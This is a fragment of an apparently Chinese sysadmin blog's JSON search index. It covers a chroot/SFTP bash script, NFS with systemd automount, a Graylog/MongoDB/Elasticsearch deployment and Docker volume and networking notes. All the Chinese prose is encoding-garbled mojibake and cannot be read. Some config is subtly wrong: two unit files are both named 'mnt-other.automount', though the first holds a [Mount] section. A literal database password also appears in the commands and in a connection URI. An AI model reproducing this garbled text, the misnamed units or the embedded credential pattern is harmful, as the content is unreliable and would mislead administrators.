¹ç›®å½•æƒé™","date":"2020-09-23","objectID":"/posts/linux/chroot%E7%B3%BB%E7%BB%9F/","tags":["linux","chroot","è§£å†³æ–¹æ¡ˆ","sftp","ssh","scripts"],"title":"Chrootç³»ç»Ÿ","uri":"/posts/linux/chroot%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"ä»¥ä¸‹æ˜¯ä¸€ç‰‡è‰ç¨¿ï¼ŒçœŸçš„çœŸçš„æ˜¯æˆ‘è‡ªå·±è®°å½•çš„ã€‚ä½†æ˜¯ï¼æˆ‘ç°åœ¨è‡ªå·±ä¹Ÿçœ‹ä¸æ‡‚äº†ï¼Œæˆ‘çœŸæ˜¯æ “Qäº†ï¼Œå¥½åƒå¤šäº†ä¸€ä¸ªchrootåˆå§‹æ²¡å•¥ç”¨ chrootç³»ç»Ÿ æ­£å¸¸æ¥è¯´é’ˆå¯¹äºæ–‡ä»¶å…±äº«çš„sftpåº”è¯¥æ˜¯ä»¥ç”¨æˆ·ä¸ºå•ä½æ¥åšçš„,ä½†è¿™å„¿æˆ‘å´ç”¨çš„æ˜¯ç»„,è¿™ä¸ªå…¶å®æ˜¯æˆ‘æµ‹è¯•ç”¨ç”¨æˆ·æ¥åšä»æ¥æ²¡æœ‰æˆåŠŸè¿‡ï¼Œåªèƒ½è¢«è¿«ç”¨ç»„ #!/bin/bash ################################################# # author 0x5c0f # date 2020-12-04 # email mail@0x5c0f.cc # web blog.0x5c0f.cc # version 1.0.0 # last update 2021-04-21 # descript Use : ./chroot.init.sh ################################################# PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin export PATH # ç”¨äºåœ¨linuxä¹‹é—´æ›¿ä»£nfsç³»ç»Ÿ # chroot ç³»ç»Ÿæ ¹ç›®å½• CHROOTHOME=\"/chroot_sftp\" # sshfs # ç”¨æˆ·é…ç½® SSHFSUID=\"1050\" SSHFSUSER=\"sshfs\" SSHFSROOT=\"/home/${SSHFSUSER}\" # sshfs chroot æ˜ å°„ç›®å½• SSHFSCHROOTDIR=\"${CHROOTHOME}/sshfsdir\" # sshfs æœ¬åœ°å…±äº«ç›®å½• SSHFSLOCALSHARE=\"/mnt/sshfsdir\" function init_chroot(){ test ! -d ${CHROOTHOME} \u0026\u0026 { mkdir -p ${CHROOTHOME}/{bin,usr,etc,lib64,home,dev,data} mknod -m 666 ${CHROOTHOME}/dev/null c 1 3 mknod -m 666 ${CHROOTHOME}/dev/tty c 5 0 mknod -m 666 ${CHROOTHOME}/dev/zero c 1 5 mknod -m 666 ${CHROOTHOME}/dev/random c 1 8 chmod o+t ${CHROOTHOME}/dev/null ${CHROOTHOME}/dev/tty ${CHROOTHOME}/dev/zero ${CHROOTHOME}/dev/random cd ${CHROOTHOME}/usr ln -sf ../bin ./bin ln -sf ../lib64 ./lib64 cp -p /bin/ls /bin/cat /bin/rm /bin/echo /bin/false /bin/touch /bin/vi /bin/mkdir ${CHROOTHOME}/bin/ for i in /bin/{ls,cat,echo,rm,false,touch,vi,mkdir}; do list=$(ldd ${i} | egrep -o '/lib.*\\.[0-9]') for _so in $list; do /bin/cp -v ${_so} ${CHROOTHOME}${_so} done done } } function config_sshd(){ cat \u003e\u003e /etc/ssh/sshd_config \u003c\u003cEOE Match $1 $2 ChrootDirectory $3 ForceCommand internal-sftp -l INFO -f AUTH X11Forwarding no AllowTcpForwarding no PasswordAuthentication no EOE systemctl restart sshd } # é…ç½®systemdç®¡ç†æ¨¡å— # $0 æ–‡ä»¶å ç»‘å®šç›®å½• ç»‘å®šç›®æ ‡ç›®å½• æ˜¯å¦åªè¯»(é»˜è®¤ä¸ºç©º: è¯»å†™) # mount -o bind${4:+,ro} ç»‘å®šç›®å½• ç»‘å®šç›®æ ‡ç›®å½• function config_systemd(){ cat \u003e /etc/systemd/system/$1 \u003c\u003cEOF # Automatically generated by systemd-fstab-generator [Unit] SourcePath=/etc/fstab Documentation=man:fstab(5) man:systemd-fstab-generator(8) Before=local-fs.target [Mount] What=${2} Where=${3} Type=none Options=defaults,bind${4:+,ro} [Install] WantedBy=multi-user.target EOF systemctl daemon-reload systemctl enable --now $1 } # åˆå§‹åŒ–sftpå¯ç”¨ç»„ function init_sshfs(){ # åˆå§‹sshdé…ç½® config_sshd \"User\" $SSHFSUSER $SSHFSCHROOTDIR # åˆ›å»ºsshfså…±äº«ç”¨æˆ· useradd -u ${SSHFSUID} -m -k $(mktemp -d) -d ${SSHFSROOT} -s /bin/false ${SSHFSUSER} # åˆ›å»ºè¿œç¨‹ç™»é™†å¯†é’¥ su - ${SSHFSUSER} -s /bin/bash -c \"ssh-keygen -f ~/.ssh/id_rsa -t rsa -b 4096 -N ''\" su - ${SSHFSUSER} -s /bin/bash -c \"cat ~/.ssh/id_rsa.pub \u003e ~/.ssh/authorized_keys \u0026\u0026 chmod 600 ~/.ssh/authorized_keys\" # åˆ›å»ºchroot sshfså…±äº«ç›®å½• mkdir -p ${CHROOTHOME}${SSHFSROOT} # ç»‘å®šç›®å½•ä¸»ç›®å½• # mount -o ro,bind ${SSHFSROOT} ${CHROOTHOME}${SSHFSROOT} # fstab # cat \u003e\u003e /etc/fstab \u003c\u003cEOF # ${SSHFSROOT} ${CHROOTHOME}${SSHFSROOT} none defaults,ro,bind 0 0 # EOF SYSTEMDFNAME=\"${CHROOTHOME#/}${SSHFSROOT//\\//-}.mount\" # é…ç½®ç”¨æˆ·å¸å·æ˜ å°„ config_systemd \"${SYSTEMDFNAME}\" \"${SSHFSROOT}\" \"${CHROOTHOME}${SSHFSROOT}\" 1 # é…ç½®sshfsç›®å½•æ˜ å°„ test ! -d ${SSHFSCHROOTDIR} \u0026\u0026 { mkdir -p $SSHFSCHROOTDIR } test ! -d $SSHFSLOCALSHARE \u0026\u0026 { mkdir -p $SSHFSLOCALSHARE } echo \"sshfs å…±äº«ç›®å½• \" \u003e $SSHFSLOCALSHARE/readme.md TSSHFSCHROOTDIR=${SSHFSCHROOTDIR#/} config_systemd \"${TSSHFSCHROOTDIR//\\//-}.mount\" \"${SSHFSLOCALSHARE}\" \"${SSHFSCHROOTDIR}\" # cat ${SSHFSROOT}/.ssh/id_rsa } init_chroot # sshfs init_sshfs èŠ‚ç‚¹æœåŠ¡å™¨é…ç½® # å¼€æœºå¯åŠ¨é¡¹ $\u003e vim /etc/fstab sshfsdir@10.0.2.30:/node21 /data/backup fuse.sshfs auto,reconnect,_netdev,user,idmap=user,identityfile=/etc/.ssh/sshfsdir,allow_other,default_permissions,uid=1002,gid=1002 0 0 # zabbix ç›‘æ§ $\u003e vim /opt/zabbix-agentd/etc/zabbix_agentd.conf.d/sshfs_status.conf UserParameter=sshfs_status,/bin/systemctl is-active data-ltbstore.mount \u003e\u0026 /dev/null \u0026\u0026 echo 0 || echo 1 ","date":"2020-09-23","objectID":"/posts/linux/chroot%E7%B3%BB%E7%BB%9F/:0:0","tags":["linux","chroot","è§£å†³æ–¹æ¡ˆ","sftp","ssh","scripts"],"title":"Chrootç³»ç»Ÿ","uri":"/posts/linux/chroot%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","é‚£äº›æœ‰ç”¨æ²¡ç”¨çš„"],"content":"NFSéƒ¨ç½²åŠautofsæ›¿ä»£æ–¹æ¡ˆsystemd","date":"2020-09-17","objectID":"/posts/linux/nfs%E9%83%A8%E7%BD%B2%E5%8F%8Aautofs%E6%9B%BF%E4%BB%A3/","tags":["linux","è§£å†³æ–¹æ¡ˆ","nfs","systemd","autofs"],"title":"NFSéƒ¨ç½²åŠautofsæ›¿ä»£","uri":"/posts/linux/nfs%E9%83%A8%E7%BD%B2%E5%8F%8Aautofs%E6%9B%BF%E4%BB%A3/"},{"categories":["linux","é‚£äº›æœ‰ç”¨æ²¡ç”¨çš„"],"content":"nfs æœåŠ¡ éƒ¨ç½² $\u003e yum install nfs-utils rpcbind \u0026\u0026 mkdir /nfsshare \u0026\u0026 chown nfsnobody. nfsshare é…ç½®æ–‡ä»¶è¯´æ˜ /etc/exports ç”¨äºç®¡ç†è´¡çŒ®ç›¸å…³é…ç½®çš„æ–‡ä»¶ å†…å®¹æ ¼å¼: NFSå…±äº«ç›®å½• NFSå®¢æˆ·ç«¯åœ°å€(å‚æ•°1ã€å‚æ•°2â€¦) å®¢æˆ·ç‚¹åœ°å€2ï¼ˆå‚æ•°1ã€å‚æ•°2â€¦ï¼‰{ç¤ºä¾‹: / master(rw) master2(insecure,rw,all_squash)} NFSè´¡çŒ®ç›®å½•: NFSå®é™…éœ€è¦è´¡çŒ®å‡ºå»çš„ç›®å½• å®¢æˆ·ç«¯åœ°å€: å®¢æˆ·ç«¯å¯ä»¥è®¿é—®è´¡çŒ®ç›®å½•çš„åœ°å€ï¼Œå¯ä»¥ä¸ºä¸»æœºåã€ipåœ°å€(ç½‘æ®µ)ã€é€šé…ç¬¦(*) å‚æ•° ä½œç”¨ ro åªè¯» rw è¯»å†™ root_squash å½“NFSå®¢æˆ·ç«¯ä»¥rootç®¡ç†å‘˜è®¿é—®æ—¶ï¼Œæ˜ å°„ä¸ºNFSæœåŠ¡å™¨çš„åŒ¿åç”¨æˆ· no_root_squash å½“NFSå®¢æˆ·ç«¯ä»¥rootç®¡ç†å‘˜è®¿é—®æ—¶ï¼Œæ˜ å°„ä¸ºNFSæœåŠ¡å™¨çš„rootç®¡ç†å‘˜ all_squash æ— è®ºNFSå®¢æˆ·ç«¯ä½¿ç”¨ä»€ä¹ˆè´¦æˆ·è®¿é—®ï¼Œå‡æ˜ å°„ä¸ºNFSæœåŠ¡å™¨çš„åŒ¿åç”¨æˆ· sync åŒæ—¶å°†æ•°æ®å†™å…¥åˆ°å†…å­˜ä¸ç¡¬ç›˜ä¸­ï¼Œä¿è¯ä¸ä¸¢å¤±æ•°æ® async ä¼˜å…ˆå°†æ•°æ®ä¿å­˜åˆ°å†…å­˜ï¼Œç„¶åå†å†™å…¥ç¡¬ç›˜ï¼›è¿™æ ·æ•ˆç‡æ›´é«˜ï¼Œä½†å¯èƒ½ä¼šä¸¢å¤±æ•°æ® insecure æ˜¯å®¢æˆ·ç«¯ä»å¤§äº1024çš„ç«¯å£å‘é€é“¾æ¥ å¯åŠ¨å’Œæ£€æŸ¥æœ¬åœ°å…±äº«æƒ…å†µ $\u003e systemctl restart nfs $\u003e showmount -e 127.0.0.1 Export list for 127.0.0.1: /nfsshare * $\u003e cat /var/lib/nfs/etab /nfsshare *(rw,sync,wdelay,hide,nocrossmnt,insecure,root_squash,no_all_squash,no_subtree_check,secure_locks,acl,no_pnfs,anonuid=65534,anongid=65534,sec=sys,rw,insecure,root_squash,no_all_squash) nfsæŒ‚è½½ $\u003e mount.nfs 127.0.0.1:/nfsshare /mnt # 127.0.0.1:/nfshare /mnt nfs defaults 0 0 \u003e\u003e /etc/fstab autofs è‡ªåŠ¨æŒ‚è½½ ä½¿ç”¨systemd automountæ›¿ä»£ # åˆ›å»ºsystemd mountå’ŒautomountèŠ‚ç‚¹ï¼Œæ–‡ä»¶åå‘½åè§„èŒƒ:æŒ‚è½½åˆ°/mnt/otherä¸‹,åå­—åˆ™å¿…é¡»ä¸º: mnt-other.mount å’Œ mnt-other.automount $\u003e vim /etc/systemd/system/mnt-other.automount [Unit] Documentation=man:fstab(5) man:systemd-fstab-generator(8) [Mount] Where=/mnt/other # æœ¬åœ°æŒ‚è½½ç›®å½• What=192.16.10.200:/nfsshare # (è¿œç¨‹)æŒ‚è½½ç‚¹ Type=nfs # æŒ‚è½½ç³»ç»Ÿç±»å‹ Options=defaults # æŒ‚è½½å‚æ•° $\u003e vim /etc/systemd/system/mnt-other.automount [Unit] Documentation=man:fstab(5) man:systemd-fstab-generator(8) [Automount] Where=/mnt/other # æœ¬åœ°æŒ‚è½½ç›®å½•ï¼ŒåŒæ­¥mountå•å…ƒçš„ç›®å½• TimeoutIdleSec=12 # è¶…æ—¶æ—¶é—´ï¼Œå¤šå°‘ç§’æœªæ“ä½œè‡ªåŠ¨å¸è½½æŒ‚è½½ç‚¹ [Install] WantedBy=multi-user.target # åˆ›å»ºå®Œæˆåé‡è½½é…ç½® $\u003e systemctl daemon-reload # æ¿€æ´» automount å¹¶åŠ å…¥å¼€æœºå¯åŠ¨é¡¹ $\u003e systemctl enable --now mnt-other.automount # å¦ï¼šautomount åœ¨centos 7ä¸‹å¯é€šè¿‡fstabé…ç½®é»˜è®¤å‚æ•°noauto,x-systemd.automount è‡ªåŠ¨åˆ›å»º(systemctl daemon-reload),åˆ›å»ºäº/run/systemd/generator/ä¸‹ ","date":"2020-09-17","objectID":"/posts/linux/nfs%E9%83%A8%E7%BD%B2%E5%8F%8Aautofs%E6%9B%BF%E4%BB%A3/:0:0","tags":["linux","è§£å†³æ–¹æ¡ˆ","nfs","systemd","autofs"],"title":"NFSéƒ¨ç½²åŠautofsæ›¿ä»£","uri":"/posts/linux/nfs%E9%83%A8%E7%BD%B2%E5%8F%8Aautofs%E6%9B%BF%E4%BB%A3/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Graylogå¤šèŠ‚ç‚¹éƒ¨ç½²","date":"2020-08-13","objectID":"/posts/linux/graylog%E5%A4%9A%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2/","tags":["linux","graylog","æ—¥å¿—"],"title":"Graylogå¤šèŠ‚ç‚¹éƒ¨ç½²","uri":"/posts/linux/graylog%E5%A4%9A%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"ä»¥ä¸‹è®°å½•ä¸‹graylogå¤šèŠ‚ç‚¹éƒ¨ç½²çš„è¿‡ç¨‹ã€‚é™„å¸¦ä¸€ä¸ªå‡ ä¸ªæ—¥å¿—æœé›†çš„é…ç½®æ–¹æ³•ã€‚ æ­¤æ¬¡éƒ¨ç½²æ˜¯ä¹Ÿæ˜¯é‡‡ç”¨dokceråŠ ç‰©ç†æœºå™¨æ··åˆéƒ¨ç½²çš„ï¼Œå„ä¸ªæ ¸å¿ƒç»„ä»¶å‡ä¸ºä¸¤ä¸ªèŠ‚ç‚¹ã€‚ mongodbé›†ç¾¤è¯´çš„æ˜¯è‡³å°‘éœ€è¦3ä¸ªèŠ‚ç‚¹æ‰ç®—æ˜¯å¯¹çš„ï¼Œä¸è¿‡è¿™å—æˆ‘ä¹Ÿä¸æ˜¯å¾ˆæ‡‚ï¼Œæˆ‘å°±åªå¤„ç†äº†ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œå¦å¤–ä¸ºä»€ä¹ˆç”¨dockeræ··åˆéƒ¨ç½²ï¼Œå› ä¸ºmongodbæˆ‘ç‰¹ä¹ˆåœ¨æœåŠ¡å™¨ä¸Šç›´æ¥å®‰è£…æä¸å®š(æ‰€æœ‰æä¸å®šçš„æˆ‘éƒ½ä¼šç”¨dockeræ··ç”¨ï¼)ã€‚è¿™ä¸¤ä¸ªé—®é¢˜æœ‰äº†è§£çš„å¸Œæœ›èƒ½æŒ‡å¯¼ä¸€ä¸‹(TODO:åº”è¯¥æ²¡æœ‰äººå›æ¥é€›æˆ‘è¿™ä¸ªç«™å§ï¼Œè™½ç„¶å¦‚æ­¤ï¼Œä½†è¿˜æ˜¯è¦å‡è£…æœ‰äººè¯´ä¸€ä¸‹çš„) 1. mongo é›†ç¾¤åˆ†ç‰‡é…ç½®(docker) åˆ›å»ºæ¯ä¸ªæˆå‘˜è¦ä½¿ç”¨çš„å‰¯æœ¬é›†å¯†é’¥æ–‡ä»¶ $\u003e mkdir -p /data/docker/mongodb \u0026\u0026 cd /data/docker/mongodb $\u003e mkdir .keyfile $\u003e cd .keyfile $\u003e openssl rand -base64 746 \u003e mongodb-keyfile $\u003e chmod 600 mongodb-keyfile $\u003e cd .. $\u003e chown -R 999.999 .keyfile # 999 æ˜¯ä¸ºdockerå†…éƒ¨çš„mongoç”¨æˆ·åŠå…¶ç»„id mongodb docker-compose é…ç½®æ–‡ä»¶(åˆ†å‘åˆ°æ¯ä¸ªèŠ‚ç‚¹ä¸Šé¢,åŒ…å«ç¬¬ä¸€æ­¥ç”Ÿæˆçš„å¯†é’¥æ–‡ä»¶) ä¿å­˜å¹¶ä¿®æ”¹ä»¥ä¸‹æ•°æ® version: '2' services: # MongoDB: https://hub.docker.com/_/mongo/ mongodb: image: mongo:3 volumes: - /data/docker/mongodb/.keyfile:/data/keyfile:ro - /data/docker/mongodb/db:/data/db - /etc/localtime:/etc/localtime:ro environment: MONGO_INITDB_ROOT_USERNAME: root MONGO_INITDB_ROOT_PASSWORD: \u003cpasswd\u003e command: mongod --auth --keyFile /data/keyfile/mongodb-keyfile --bind_ip_all --wiredTigerCacheSizeGB 1.5 --replSet rs0 ports: - \"27017:27017\" networks: - mongodb networks: mongodb: driver: bridge åˆå§‹åŒ–å‰¯æœ¬é›†ã€åˆ›å»ºç”¨æˆ·ã€æˆæƒ(ä¸€ä¸ªèŠ‚ç‚¹ä¸Šæ‰§è¡Œå°±å¯ä»¥äº†) $\u003e docker exec -it mongodb_mongodb_1 bash rs0:SECONDARY\u003e mongo -u root -p \u003cpasswd\u003e rs0:SECONDARY\u003e rs.initiate({_id : 'rs0',members: [{ _id : 0, host : \"192.16.10.200:27017\" },{ _id : 1, host : \"192.16.10.201:27017\" }]}) # æ­¤å¤„åœ¨åç»­æµ‹è¯•ä¸­ï¼Œä¸¤ä¸ªèŠ‚ç‚¹å¤„äºéåŒä¸€ç½‘æ®µï¼Œæˆ–åŒä¸€ç½‘å…³ä¸‹å‡ºç°è¿‡`no host described in new configuration 1 for replica set rs0 maps to this node docker`,ä½†æœªè§£å†³ï¼Œåæ¥æ¢åˆ°è‡ªå·±æ–°å»ºçš„æµ‹è¯•æœºå™¨åˆæ­£å¸¸äº† rs0:SECONDARY\u003e rs.status() rs0:SECONDARY\u003e use graylog rs0:PRIMARY\u003e db.createUser( { user: \"graylog\", pwd: \"JlQy8fKAvpPMfLAf\", roles: [ { role: \"readWrite\", db: \"graylog\" } ]}); Successfully added user: { \"user\" : \"graylog\", \"roles\" : [ { \"role\" : \"readWrite\", \"db\" : \"graylog\" } ] } rs0:PRIMARY\u003e db.grantRolesToUser( \"graylog\" , [ { role: \"dbAdmin\", db: \"graylog\" } ]) rs0:PRIMARY\u003e show users { \"_id\" : \"graylog.graylog\", \"userId\" : UUID(\"94720c5f-ddca-4dfb-8252-57e84ba86280\"), \"user\" : \"graylog\", \"db\" : \"graylog\", \"roles\" : [ { \"role\" : \"dbAdmin\", \"db\" : \"graylog\" }, { \"role\" : \"readWrite\", \"db\" : \"graylog\" } ] } rs0:PRIMARY\u003e db.auth(\"graylog\",\"JlQy8fKAvpPMfLAf\") 1 ä»¥ä¸Šmongodbéƒ¨ç½²å®Œæˆäº†ã€‚ 2. elasticserach å®‰è£…é…ç½® å¯¼å…¥elasticsearch-oss yum æº ,å®‰è£… (å¤šèŠ‚ç‚¹) $\u003e cat /etc/yum.repo.d/elasticsearch.repo [elasticsearch-6.x] name=Elasticsearch repository for 6.x packages baseurl=https://artifacts.elastic.co/packages/oss-6.x/yum gpgcheck=1 gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearch enabled=1 autorefresh=1 type=rpm-md $\u003e yum install elasticsearch-oss -y # æ³¨æ„å®‰è£…jdkå¹¶å¯¼å…¥ç¯å¢ƒå˜é‡ ä¿®æ”¹elasticsearch é…ç½®æ–‡ä»¶ä»¥ä¸‹å‚æ•° $\u003e grep \"^[a-Z]\" /etc/elasticsearch/elasticsearch.yml cluster.name: graylog # é›†ç¾¤å node.name: es-node-01 # èŠ‚ç‚¹å(èŠ‚ç‚¹åå”¯ä¸€ï¼Œå…¶ä»–èŠ‚ç‚¹æ³¨æ„ä¿®æ”¹) network.host: 192.16.10.200 # å½“å‰æœåŠ¡å™¨IP discovery.zen.ping.unicast.hosts: [\"192.16.10.200\", \"192.16.10.201\"] # å„ä¸ªèŠ‚ç‚¹ discovery.zen.minimum_master_nodes: 2 å¯åŠ¨ç¨‹åº # yumå®‰è£…é»˜è®¤ä¹Ÿæ˜¯æ²¡æœ‰åˆ›å»ºelasticsearché»˜è®¤è´¦å·çš„ï¼Œéœ€è¦åˆ›å»º $\u003e useradd -d /usr/share/elasticsearch -s /sbin/nologin elasticsearch $\u003e systemctl start elasticsearch.service $\u003e systemctl enable elasticsearch.service 3. graylog-server å®‰è£…é…ç½® å®‰è£… $\u003e rpm -Uvh https://packages.graylog2.org/repo/packages/graylog-2.2-repository_latest.rpm $\u003e sudo yum install graylog-server ä¿®æ”¹é…ç½®æ–‡ä»¶ $\u003e vim /etc/graylog/server/server.conf is_master = true # éä¸»èŠ‚ç‚¹éœ€è¦ä¿®æ”¹ä¸ºfalse password_secret = \u003csecret\u003e # token ï¼Œ 64ä½ä»¥ä¸Šéšæœºå€¼ï¼Œæ¯ä¸ªèŠ‚ç‚¹éœ€è¦ä¸€è‡´ï¼Œè¿è¡Œä¸­ï¼Œä¸å¯ä¿®æ”¹ root_username = admin root_password_sha2 = \u003csha256\u003e # ç™»é™†å¯†ç , sha256 åŠ å¯† \u003cecho -n \"Enter Password: \" \u0026\u0026 head -1 \u003c/dev/stdin | tr -d '\\n' | sha256sum | cut -d\" \" -f1\u003e root_email = \u003cexample@mail.com\u003e # ä¸»è´¦å·é‚®ç®± root_timezone = Asia/Shanghai # æ—¶åŒº http_bind_address = 192.16.10.200:9900 # http ä»£ç†è®¿é—®åœ°å€,å»ºè®®ç»‘å®šç½‘å¡ip elasticsearch_hosts = http://192.16.10.200:9200,http://192.16.10.201:9200 # elasticsearchåœ°å€ï¼Œå¤šä¸ªé€—å·éš”å¼€ allow_highlighting = true # æœç´¢ç»“æœé«˜äº®ï¼Œé»˜è®¤å…³é—­çŠ¶æ€ï¼Œéœ€è¦å¯æ‰“å¼€ mongodb_uri = mongodb://graylog:JlQy8fKAvpPMfLAf@192.16.10.200:27017,192.16.10.201:27017/graylog?replicaSet=rs0 # mongodbåœ°å€ï¼Œæ³¨æ„çœ‹æ ¼å¼ # transport_email_**** é‚®ä»¶çš„ç›¸å…³é…ç½®ï¼Œæ˜¯å‰ç«¯ç”¨æ¥é…ç½®å‘Šè­¦ç”¨çš„ï¼Œå¿…é¡»åœ¨è¿™å„¿é…ç½®ï¼Œä¸è¿‡æˆ‘é…ç½®äº†æ‰“æ­»ç”Ÿä¸äº†æ•ˆ å¯åŠ¨ $\u003e systemctl start ","date":"2020-08-13","objectID":"/posts/linux/graylog%E5%A4%9A%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2/:0:0","tags":["linux","graylog","æ—¥å¿—"],"title":"Graylogå¤šèŠ‚ç‚¹éƒ¨ç½²","uri":"/posts/linux/graylog%E5%A4%9A%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Dockerè¿›é˜¶","date":"2020-07-19","objectID":"/posts/linux/docker%E8%BF%9B%E9%98%B6/","tags":["linux","docker"],"title":"Dockerè¿›é˜¶","uri":"/posts/linux/docker%E8%BF%9B%E9%98%B6/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"volume(å·æŒ‚è½½) ä¸ bind mount (ç›®å½•æŒ‚è½½) # åˆ›å»ºå· [root@00 ~]# docker volume create docker_data docker_data # æŸ¥çœ‹å·²æœ‰å· [root@00 ~]# docker volume ls DRIVER VOLUME NAME local docker_data # äº§çœ‹å·è¯¦ç»†ä¿¡æ¯ [root@00 ~]# docker volume inspect docker_data [ { \"CreatedAt\": \"2019-03-04T14:20:40+08:00\", \"Driver\": \"local\", \"Labels\": {}, \"Mountpoint\": \"/var/lib/docker/volumes/docker_data/_data\", \"Name\": \"docker_data\", \"Options\": {}, \"Scope\": \"local\" } ] # æŒ‚è½½å· # å½“srcå€¼ä»¥é/å¼€å¤´æ—¶ï¼Œå¦‚æœä¸å­˜åœ¨è¯¥åå­—çš„volumeï¼Œåˆ™è‡ªåŠ¨åˆ›å»ºä½¿ç”¨ï¼Œå­˜åœ¨åˆ™ç›´æ¥ä½¿ç”¨ï¼Œè‹¥å€¼ä»¥/å¼€å¤´ï¼Œåˆ™ä½¿ç”¨å¯¹åº”å½“å‰æ“ä½œç³»ç»Ÿå¯¹åº”ç›®å½•è¿›è¡ŒæŒ‚è½½,ä¸å­˜åœ¨ç›®å½•ä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯(ä½†è‹¥ä½¿ç”¨-vå‚æ•°ï¼Œåˆ™ä¼šè‡ªåŠ¨åˆ›å»ºå¯¹åº”ç›®å½•) # å¦ volumeï¼Œè‹¥volumeä¸ºæ–°å»ºï¼Œå½“å®¹å™¨å†…æŒ‚è½½ç›®å½•å­˜åœ¨æ•°æ®æ—¶ï¼Œåˆ™ä¼šå°†æ•°æ®æŒ‚è½½åˆ°volumeä¸­ï¼Œè€Œbind mount(ç›®å½•æŒ‚è½½)åˆ™ä¼šæ¸…ç©ºå®¹å™¨å†…æŒ‚è½½ç›®å½•ã€‚ # è‹¥volumeä¸ºéæ–°å»ºï¼Œvolumeä¸­å·²ç»å­˜åœ¨æ•°æ®æ—¶ï¼Œåˆ™ä¼šå°†å®¹å™¨å†…æŒ‚è½½ç›®å½•æ•°æ®éšè—å¹¶å°†volumeçš„æ•°æ®æŒ‚è½½è¿›å…¥å®¹å™¨å†…ç›®å½•ã€‚ [root@00 ~]# docker run -td --name centos01 --mount src=docker_data,dst=/data centos # docker run -td --name centos01 --v docker_data:/data centos # docker run -td --name centos01 --mount type=bind,src=/data,dst=/data centos # docker run -td --name centos01 --v /data:/data centos 3efe72134d7c796db548f343e5a8b11436271b9bbea2a9b07c2f868257a47247 [root@00 ~]# docker exec -it centos01 ls -d /data /data [root@00 ~]# docker exec -it centos01 touch /data/test{1..4} [root@00 ~]# docker exec -it centos01 ls /data test1 test2 test3 test4 [root@00 ~]# ls -l /var/lib/docker/volumes/docker_data/_data/ æ€»ç”¨é‡ 0 -rw-r--r--. 1 root root 0 3æœˆ 4 14:32 test1 -rw-r--r--. 1 root root 0 3æœˆ 4 14:32 test2 -rw-r--r--. 1 root root 0 3æœˆ 4 14:32 test3 -rw-r--r--. 1 root root 0 3æœˆ 4 14:32 test4 # åˆ é™¤å·(åªæœ‰åˆ é™¤å·çš„æ—¶å€™ï¼Œå·ä¸­çš„æ•°æ®æ‰ä¼šè¢«åˆ é™¤ï¼Œåˆ é™¤å®¹å™¨ä¸ä¼šåˆ é™¤å·æ•°æ®) [root@00 ~]# docker volume rm docker_data ç½‘ç»œæ¨¡å¼ bridge -net=bridge é»˜è®¤ç½‘ç»œï¼Œdockerå¯åŠ¨ååˆ›å»ºä¸€ä¸ªdocker0çš„ç½‘æ¡¥ï¼Œé»˜è®¤åˆ›å»ºå®¹å™¨ä¹Ÿæ˜¯æ·»åŠ åˆ°æ­¤ç½‘æ¡¥ä¸­ host -net=host å®¹å™¨ä¸ä¼šè·å¾—ä¸€ä¸ªç‹¬ç«‹çš„ç½‘ç»œç©ºé—´ï¼Œè€Œæ˜¯ä¸å®¿ä¸»æœºå…±ç”¨ä¸€ä¸ª,è¿™å°±æ„å‘³ç€å®¹å™¨ä¸ä¼šæœ‰è‡ªå·±çš„ç½‘å¡ä¿¡æ¯ï¼Œè€Œæ˜¯ä½¿ç”¨å®¿ä¸»åŠçš„ï¼Œå®¹å™¨é™¤äº†ç½‘ç»œï¼Œå…¶ä»–éƒ½æ˜¯éš”ç¦»çš„ã€‚ none -net=none è·å–ç‹¬ç«‹çš„ç½‘ç»œç©ºé—´ï¼Œä½†ä¸ä¸ºå®¹å™¨è¿›è¡Œä»»ä½•ç½‘ç»œé…ç½®ï¼Œéœ€è¦æ‰‹åŠ¨é…ç½® container -net=container:name/id ä¸æŒ‡å®šå®¹å™¨ä½¿ç”¨åŒä¸€ä¸ªç½‘ç»œç©ºé—´ï¼Œå…·æœ‰åŒæ ·çš„ç½‘ç»œé…ç½®ä¿¡æ¯ï¼Œä¸¤ä¸ªå®¹å™¨é™¤äº†ç½‘ç»œï¼Œå…¶ä»–éƒ½æ˜¯éš”ç¦»çš„ã€‚ è‡ªå®šä¹‰ç½‘ç»œ ä¸é»˜è®¤çš„bridgeåŸç†ä¸€æ · ","date":"2020-07-19","objectID":"/posts/linux/docker%E8%BF%9B%E9%98%B6/:0:0","tags":["linux","docker"],"title":"Dockerè¿›é˜¶","uri":"/posts/linux/docker%E8%BF%9B%E9%98%B6/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Dockerè¿ç»´æ•…éšœè®°å½•","date":"2020-07-19","objectID":"/posts/linux/docker%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/","tags":["linux","docker","è§£å†³æ–¹æ¡ˆ"],"title":"Dockerè¿ç»´æ•…éšœè®°å½•","uri":"/posts/linux/docker%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"docker centos7 é•œåƒ systemctl æŠ¥é”™ Failed to get D-Bus connection: Operation not permitted https://blog.csdn.net/xiaochonghao/article/details/64438246 docker run --privileged -itd -v /sys/fs/cgroup:/sys/fs/cgroup centos /usr/sbin/init docker DOCKER-USER è§„åˆ™é“¾ä¸¢å¤± https://blog.csdn.net/Liv2005/article/details/112850208 https://docs.docker.com/network/iptables/ DOCKER-USER æ˜¯ç”¨äºæ§åˆ¶å¤–éƒ¨ç½‘ç»œä¸ 